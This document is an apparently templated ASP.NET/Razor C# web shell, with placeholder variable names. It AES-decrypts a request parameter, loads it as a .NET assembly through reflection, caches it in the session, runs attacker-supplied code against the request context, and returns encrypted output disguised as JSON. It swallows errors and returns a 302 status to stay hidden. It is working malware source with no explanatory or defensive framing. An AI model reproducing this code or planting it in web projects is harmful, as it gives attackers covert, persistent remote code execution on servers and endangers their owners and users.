try {
string {strwu}  = System.Text.Encoding.Default.GetString(Convert.FromBase64String("{pass}"));
 string {strsi} = System.Text.Encoding.Default.GetString(Convert.FromBase64String("{secretKey}"));
  byte[] {strer} = System.Convert.FromBase64String(Context.Request[{strwu}]);
byte[] {strsan} = System.Text.Encoding.Default.GetBytes({strsi});
{strer} = new System.Security.Cryptography.AesManaged().CreateDecryptor({strsan}, {strsan}).TransformFinalBlock({strer}, 0, {strer}.Length);
if (Context.Session["{stryi}"] == null){
Type {strshier} = typeof(System.Reflection.Assembly);
Type[] parameterTypes = new Type[] { typeof(byte[]) };
var {strshisan} = {strshier}.GetMethods();
System.Reflection.MethodInfo loadMethod = {strshisan}
    .FirstOrDefault(m => m.Name == "Load" && m.GetParameters().Length == 1 && m.GetParameters()[0].ParameterType == typeof(byte[]));
    object assemblyObject = (System.Reflection.Assembly)loadMethod.Invoke(null, new object[] { {strer} });
    Context.Session["{stryi}"] = assemblyObject;
}else { var {strba} = new System.IO.MemoryStream();
    object {strliu} = ((System.Reflection.Assembly)Context.Session["{stryi}"]).CreateInstance("LY");
    {strliu}.Equals(Context);{strliu}.Equals({strba});
    {strliu}.Equals({strer});{strliu}.ToString();
    byte[] {strqi} = {strba}.ToArray();
    string {strjiu}=System.Text.Encoding.Default.GetString(Convert.FromBase64String("eyJkYXRhIjoi"));
    @Context.Response.Write({strjiu});
    string {strshiyi} = System.Convert.ToBase64String(new System.Security.Cryptography.AesManaged().CreateEncryptor({strsan}, {strsan}).TransformFinalBlock({strqi}, 0, {strqi}.Length));
    string {strshi}="\"}";Context.Response.Write({strshiyi});Context.Response.Write({strshi});
     } } catch (System.Exception) { };Response.StatusCode = 302;